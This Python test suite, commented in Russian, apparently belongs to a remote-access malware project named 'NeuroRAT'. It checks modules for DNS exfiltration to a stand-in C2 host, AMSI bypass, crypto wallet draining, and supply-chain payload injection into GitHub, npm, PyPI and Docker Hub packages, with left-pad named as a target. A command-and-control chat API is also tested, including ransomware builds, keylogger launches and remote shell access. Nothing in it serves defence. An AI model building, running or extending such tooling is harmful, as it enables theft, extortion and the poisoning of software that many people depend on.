#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Тесты для модуля продвинутых техник обхода защиты (advanced_evasion.py)
"""

import unittest
import os
import sys
import socket
import platform
import tempfile
import shutil
import json
import logging
from unittest.mock import patch, MagicMock
from agent_modules.crypto_stealer import WalletDrainer
from agent_modules.supply_chain_infection import SupplyChainInfectionEngine
from fastapi.testclient import TestClient
import server_api

# Настраиваем логирование
logging.basicConfig(level=logging.DEBUG)

# Импортируем модуль для тестирования
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from agent_modules.advanced_evasion import AdvancedEvasion


class TestAdvancedEvasion(unittest.TestCase):
    """Тесты для модуля AdvancedEvasion"""
    
    def setUp(self):
        """Подготовка к тестам"""
        self.evasion = AdvancedEvasion(log_actions=True)
        self.test_dir = tempfile.mkdtemp()
        
    def tearDown(self):
        """Очистка после тестов"""
        shutil.rmtree(self.test_dir, ignore_errors=True)
    
    def test_initialization(self):
        """Тест инициализации модуля"""
        self.assertEqual(self.evasion.os_type, platform.system().lower())
        self.assertIsNotNone(self.evasion.string_xor_key)
        self.assertTrue(len(self.evasion.string_xor_key) == 16)
        self.assertTrue(isinstance(self.evasion.action_log, list))
    
    def test_string_obfuscation(self):
        """Тест обфускации строк"""
        test_strings = [
            "whoami", 
            "ls -la", 
            "netstat -an",
            "system_info",
            "ThisIsAVeryLongStringForTestingPurposesOnly"
        ]
        
        for test_str in test_strings:
            obfuscated = self.evasion.obfuscate_string(test_str)
            deobfuscated = self.evasion.deobfuscate_string(obfuscated)
            
            # Проверяем, что обфусцированная строка отличается от исходной
            self.assertNotEqual(test_str, obfuscated)
            
            # Проверяем, что деобфусцированная строка соответствует исходной
            self.assertEqual(test_str, deobfuscated)
            
            # Проверяем, что обфусцированная строка содержит hex-последовательности
            self.assertTrue(obfuscated.startswith("\\x"))
    
    @patch('socket.gethostbyname')
    def test_dns_exfiltration(self, mock_gethostbyname):
        """Тест DNS exfiltration с мок-объектами"""
        mock_gethostbyname.side_effect = socket.gaierror  # Ожидаемая ошибка
        
        test_data = "Тестовые данные для DNS exfiltration"
        test_domain = "test-c2.example.com"
        
        result = self.evasion.dns_exfiltrate(test_data, domain=test_domain)
        
        # Проверяем возвращаемое значение
        self.assertTrue("Данные отправлены через DNS" in result)
        
        # Проверяем, что метод gethostbyname был вызван
        self.assertTrue(mock_gethostbyname.called)
        
        # Проверяем лог действий
        self.assertTrue(any("dns_exfiltrate" in entry.get("type", "") for entry in self.evasion.action_log))
    
    @unittest.skipIf(platform.system().lower() != "windows", "Тест только для Windows")
    def test_windows_amsi_bypass(self):
        """Тест обхода AMSI (только для Windows)"""
        with patch('ctypes.WinDLL') as mock_windll, \
             patch('ctypes.c_void_p.in_dll') as mock_in_dll, \
             patch('ctypes.windll.kernel32.VirtualProtect') as mock_virtualprotect, \
             patch('ctypes.memmove') as mock_memmove:
            
            # Настройка мок-объектов
            mock_windll.return_value = MagicMock()
            mock_in_dll.return_value = MagicMock()
            mock_virtualprotect.return_value = True
            
            result = self.evasion.amsi_bypass()
            
            # Проверяем результат
            self.assertEqual(result, "AMSI bypass успешно применен")
            
            # Проверяем, что нужные методы были вызваны
            mock_windll.assert_called_once_with("amsi.dll")
            mock_virtualprotect.assert_called()
            mock_memmove.assert_called_once()
    
    @unittest.skipIf(not hasattr(unittest.TestCase, 'assertLogs'), "Python < 3.4 не поддерживает assertLogs")
    def test_logging(self):
        """Тест журналирования действий"""
        with self.assertLogs('advanced_evasion', level='DEBUG') as cm:
            self.evasion.obfuscate_string("test_logging")
            
        # Проверяем, что было как минимум одно сообщение DEBUG
        self.assertTrue(any('DEBUG' in log for log in cm.output))
        
        # Проверяем, что есть запись в журнале действий
        self.assertGreater(len(self.evasion.action_log), 0)
        
        # Отключаем логирование и проверяем, что записи больше не добавляются
        old_log_size = len(self.evasion.action_log)
        self.evasion.log_actions = False
        self.evasion.obfuscate_string("without_logging")
        self.assertEqual(len(self.evasion.action_log), old_log_size)
    
    @patch('requests.get')
    def test_polymorphic_exfil(self, mock_get):
        """Тест полиморфной стеганографии"""
        # Настраиваем мок для requests.get
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_get.return_value = mock_response
        
        # Добавляем мок для HAS_REQUESTS
        # Получаем модуль напрямую
        module_name = self.evasion.__module__
        module = sys.modules[module_name]
        original_has_requests = getattr(module, 'HAS_REQUESTS', False)
        setattr(module, 'HAS_REQUESTS', True)
        
        try:
            test_data = "Секретные данные для передачи через стеганографию"
            result = self.evasion.polymorphic_exfil(test_data)
            
            # Проверяем результат
            self.assertTrue("Данные успешно экспортированы" in result)
            
            # Проверяем, что был вызван requests.get с правильными параметрами
            mock_get.assert_called_once()
            call_args = mock_get.call_args[1]
            
            # Проверяем структуру заголовков и параметров
            self.assertIn('headers', call_args)
            self.assertIn('params', call_args)
            headers = call_args['headers']
            params = call_args['params']
            
            # Проверяем наличие нужных заголовков
            self.assertIn('User-Agent', headers)
            self.assertIn('Accept', headers)
            self.assertIn('Cookie', headers)
            
            # Проверяем наличие нужных параметров
            self.assertIn('search', params)
            self.assertIn('category', params)
        finally:
            # Восстанавливаем оригинальное значение HAS_REQUESTS
            setattr(module, 'HAS_REQUESTS', original_has_requests)
    
    def test_get_status(self):
        """Тест получения статуса модуля"""
        status = self.evasion.get_status()
        
        # Проверяем наличие ключевых полей
        self.assertIn('os', status)
        self.assertIn('is_admin', status)
        self.assertIn('action_count', status)
        self.assertIn('ctypes_available', status)
        self.assertIn('requests_available', status)
        
        # Проверяем типы данных
        self.assertIsInstance(status['os'], str)
        self.assertIsInstance(status['is_admin'], bool)
        self.assertIsInstance(status['action_count'], int)
        
        # Проверяем, что счетчик действий соответствует размеру журнала
        self.assertEqual(status['action_count'], len(self.evasion.action_log))


class TestWalletDrainer(unittest.TestCase):
    def setUp(self):
        self.output_dir = "/tmp/test_wallet_drainer"
        os.makedirs(self.output_dir, exist_ok=True)
        self.drainer = WalletDrainer(output_dir=self.output_dir, c2_url=None)

    def test_run_and_report(self):
        result = self.drainer.run()
        self.assertEqual(result["status"], "success")
        self.assertIn("wallets", result)
        self.assertIn("wallet_drainer_report", result)
        # Проверяем, что отчет создан
        report_path = result["wallet_drainer_report"]
        self.assertTrue(os.path.exists(report_path))
        with open(report_path) as f:
            report = json.load(f)
        self.assertIn("wallets", report)
        self.assertIn("withdraw_results", report)

    def tearDown(self):
        # Чистим тестовые файлы
        import shutil
        shutil.rmtree(self.output_dir, ignore_errors=True)


class TestSupplyChainInfectionEngine(unittest.TestCase):
    def setUp(self):
        self.output_dir = "/tmp/test_supply_chain"
        os.makedirs(self.output_dir, exist_ok=True)
        self.engine = SupplyChainInfectionEngine(output_dir=self.output_dir)

    def test_scan_targets(self):
        targets = self.engine.scan_targets()
        self.assertTrue(len(targets) > 0)
        self.assertIn("type", targets[0])

    def test_inject_payload(self):
        targets = self.engine.scan_targets()
        result = self.engine.inject_payload(targets[0], payload_type="drainer")
        self.assertEqual(result["status"], "success")
        self.assertEqual(result["payload"], "drainer")

    def test_run_and_report(self):
        report = self.engine.run()
        self.assertEqual(report["status"], "success")
        self.assertIn("infection_results", report)
        self.assertTrue(os.path.exists(self.output_dir))

    def tearDown(self):
        import shutil
        shutil.rmtree(self.output_dir, ignore_errors=True)

    def test_github_injection_dryrun(self):
        github_target = {
            "type": "github",
            "name": "left-pad",
            "repo": "https://github.com/stevemao/left-pad.git"
        }
        result = self.engine.inject_payload(github_target, payload_type="drainer")
        self.assertIn(result["status"], ["dryrun", "success", "error"])
        self.assertIn("details", result)

    def test_inject_real_payloads(self):
        targets = self.engine.scan_targets()
        # metasploit
        res = self.engine.inject_payload(targets[0], payload_type="metasploit", custom_payload_code="echo 'msf test'" )
        self.assertIn(res["payload"], ["metasploit"])
        # mimikatz
        res = self.engine.inject_payload(targets[0], payload_type="mimikatz", custom_payload_code="echo mimikatz test")
        self.assertIn(res["payload"], ["mimikatz"])
        # impacket
        res = self.engine.inject_payload(targets[0], payload_type="impacket", custom_payload_code="echo impacket test")
        self.assertIn(res["payload"], ["impacket"])
        # sliver
        res = self.engine.inject_payload(targets[0], payload_type="sliver", custom_payload_code="echo sliver test")
        self.assertIn(res["payload"], ["sliver"])
        # bof
        res = self.engine.inject_payload(targets[0], payload_type="bof", custom_payload_code="echo bof test")
        self.assertIn(res["payload"], ["bof"])
        # cme
        res = self.engine.inject_payload(targets[0], payload_type="cme", custom_payload_code="echo cme test")
        self.assertIn(res["payload"], ["cme"])


class TestGitHubSupplyChain(unittest.TestCase):
    def test_find_supply_chain_targets(self):
        try:
            from agent_modules.github_supply_chain import find_supply_chain_targets
        except ImportError:
            self.skipTest("github_supply_chain module not found")
        targets = find_supply_chain_targets()
        self.assertIsInstance(targets, list)
        if targets:
            t = targets[0]
            self.assertIn("name", t)
            self.assertIn("repo", t)
            self.assertIn("stars", t)
            self.assertIn("workflows", t)


class TestNPMSupplyChain(unittest.TestCase):
    def test_find_npm_supply_chain_targets(self):
        try:
            from agent_modules.npm_supply_chain import find_npm_supply_chain_targets
        except ImportError:
            self.skipTest("npm_supply_chain module not found")
        targets = find_npm_supply_chain_targets(5)
        self.assertIsInstance(targets, list)
        if targets:
            t = targets[0]
            self.assertIn("name", t)
            self.assertIn("version", t)
            self.assertIn("type", t)


class TestPyPISupplyChain(unittest.TestCase):
    def test_find_pypi_supply_chain_targets(self):
        try:
            from agent_modules.pypi_supply_chain import find_pypi_supply_chain_targets
        except ImportError:
            self.skipTest("pypi_supply_chain module not found")
        targets = find_pypi_supply_chain_targets(5)
        self.assertIsInstance(targets, list)
        if targets:
            t = targets[0]
            self.assertIn("name", t)
            self.assertIn("type", t)


class TestDockerHubSupplyChain(unittest.TestCase):
    def test_find_dockerhub_supply_chain_targets(self):
        try:
            from agent_modules.dockerhub_supply_chain import find_dockerhub_supply_chain_targets
        except ImportError:
            self.skipTest("dockerhub_supply_chain module not found")
        targets = find_dockerhub_supply_chain_targets(5)
        self.assertIsInstance(targets, list)
        if targets:
            t = targets[0]
            self.assertIn("name", t)
            self.assertIn("type", t)


class TestGitHubInjector(unittest.TestCase):
    def test_inject_github_pull_request_dryrun(self):
        try:
            from agent_modules.github_injector import inject_github_pull_request
        except ImportError:
            self.skipTest("github_injector module not found")
        result = inject_github_pull_request("https://github.com/stevemao/left-pad.git")
        self.assertIn(result["status"], ["dryrun", "error"])
        self.assertIn("details", result)


class TestChatAPI(unittest.TestCase):
    def setUp(self):
        self.client = TestClient(server_api.app)
        # Добавляем тестового агента
        self.agent_id = "test-agent-1"
        server_api.agent_data.append({
            "agent_id": self.agent_id,
            "os": "Linux",
            "hostname": "testhost",
            "username": "testuser",
            "ip_address": "127.0.0.1",
            "status": "active",
            "first_seen": 0,
            "last_seen": 0,
            "system_info": {}
        })
        if self.agent_id not in server_api.chat_histories:
            server_api.chat_histories[self.agent_id] = []

    def tearDown(self):
        # Чистим тестовых агентов и историю
        server_api.agent_data = [a for a in server_api.agent_data if a["agent_id"] != self.agent_id]
        if self.agent_id in server_api.chat_histories:
            del server_api.chat_histories[self.agent_id]

    def test_chat_page_renders(self):
        resp = self.client.get(f"/api/agent/{self.agent_id}/chat")
        self.assertEqual(resp.status_code, 200)
        self.assertIn("NeuroRAT-Agent", resp.text)
        self.assertIn(self.agent_id, resp.text)

    def test_chat_api_post(self):
        msg = "!sysinfo"
        resp = self.client.post(f"/api/agent/{self.agent_id}/chat", json={"message": msg, "autonomous_mode": False})
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertIn("response", data)
        # Проверяем, что сообщение появилось в истории
        history = server_api.chat_histories[self.agent_id]
        self.assertTrue(any(e["content"] == msg for e in history if e["sender"] == "user"))
        self.assertTrue(any(e["sender"] == "agent" for e in history))

    def test_terminal_websocket(self):
        # Проверяем, что websocket endpoint для терминала существует и отвечает (имитация)
        import websockets
        import asyncio
        async def ws_test():
            uri = f"ws://localhost:8000/api/agent/terminal/ws?agent_id={self.agent_id}"
            try:
                async with websockets.connect(uri) as websocket:
                    await websocket.send('{"command": "whoami"}')
                    msg = await websocket.recv()
                    self.assertIn("output", msg)
            except Exception as e:
                self.skipTest(f"WebSocket not available: {e}")
        try:
            asyncio.get_event_loop().run_until_complete(ws_test())
        except Exception:
            pass

    def test_function_calling_api(self):
        # Проверяем, что !api_call supply_chain_attack работает через чат
        msg = '!api_call supply_chain_attack {"target": "github.com/victim/repo", "payload": "drainer"}'
        resp = self.client.post(f"/api/agent/{self.agent_id}/chat", json={"message": msg, "autonomous_mode": False})
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertIn("response", data)
        self.assertTrue("supply-chain" in data["response"] or "supply_chain" in data["response"] or "drainer" in data["response"])

    def test_file_upload(self):
        # Проверяем загрузку файла через API
        import io
        file_content = b"testdata123"
        resp = self.client.post(
            "/api/files/upload",
            data={"agent_id": self.agent_id},
            files={"file": ("test.txt", io.BytesIO(file_content), "text/plain")}
        )
        self.assertEqual(resp.status_code, 200)
        self.assertIn("uploaded", resp.text.lower())

    def test_prompt_modal(self):
        # Проверяем, что Model_Prompt.md и Agent Plan.md доступны через /static
        resp1 = self.client.get("/static/Model_Prompt.md")
        resp2 = self.client.get("/static/Agent%20Plan.md")
        self.assertEqual(resp1.status_code, 200)
        self.assertIn("агент", resp1.text.lower())
        self.assertEqual(resp2.status_code, 200)
        self.assertIn("neurorat", resp2.text.lower())

    def test_reasoning_chain_of_thought(self):
        # Проверяем reasoning/chain-of-thought через чат
        msg = '!reasoning'
        resp = self.client.post(f"/api/agent/{self.agent_id}/chat", json={"message": msg, "autonomous_mode": False})
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertIn("response", data)
        self.assertEqual(data["response_type"], "reasoning")
        chain = data["response"]
        self.assertIn("sections", chain)
        self.assertIn("conclusion", chain)
        self.assertIn("actions", chain)
        # Если есть actions, должен быть actions_output
        if chain["actions"]:
            self.assertIn("actions_output", chain)

    def test_wallet_drainer_api_call(self):
        msg = '!api_call wallet_drainer {}'
        resp = self.client.post(f"/api/agent/{self.agent_id}/chat", json={"message": msg, "autonomous_mode": False})
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertIn("response", data)
        self.assertIn("wallet_drainer", data["response"])

    def test_ransomware_build_api_call(self):
        msg = '!api_call ransomware_build {"wallet_address": "test_wallet", "ransom_amount": "0.01 BTC"}'
        resp = self.client.post(f"/api/agent/{self.agent_id}/chat", json={"message": msg, "autonomous_mode": False})
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertIn("response", data)
        self.assertIn("ransomware_build", data["response"])

    def test_run_module_api_call(self):
        msg = '!run_module keylogger'
        resp = self.client.post(f"/api/agent/{self.agent_id}/chat", json={"message": msg, "autonomous_mode": False})
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertIn("response", data)
        self.assertIn("run_module", data["response"])

    def test_chat_history_filter_download(self):
        # Добавляем несколько сообщений
        self.client.post(f"/api/agent/{self.agent_id}/chat", json={"message": "test1", "autonomous_mode": False})
        self.client.post(f"/api/agent/{self.agent_id}/chat", json={"message": "test2", "autonomous_mode": False})
        self.client.post(f"/api/agent/{self.agent_id}/chat", json={"message": "!reasoning", "autonomous_mode": False})
        # Фильтрация по search
        resp = self.client.get(f"/api/agent/{self.agent_id}/chat/history?search=test1")
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertTrue(any("test1" in e.get("content", "") for e in data))
        # Фильтрация по sender
        resp = self.client.get(f"/api/agent/{self.agent_id}/chat/history?sender=reasoning")
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertTrue(any(e.get("sender") == "reasoning" for e in data))
        # Выгрузка истории (download)
        resp = self.client.get(f"/api/agent/{self.agent_id}/chat/history?download=true")
        self.assertEqual(resp.status_code, 200)
        self.assertIn("application/json", resp.headers.get("content-type", ""))


if __name__ == '__main__':
    unittest.main() 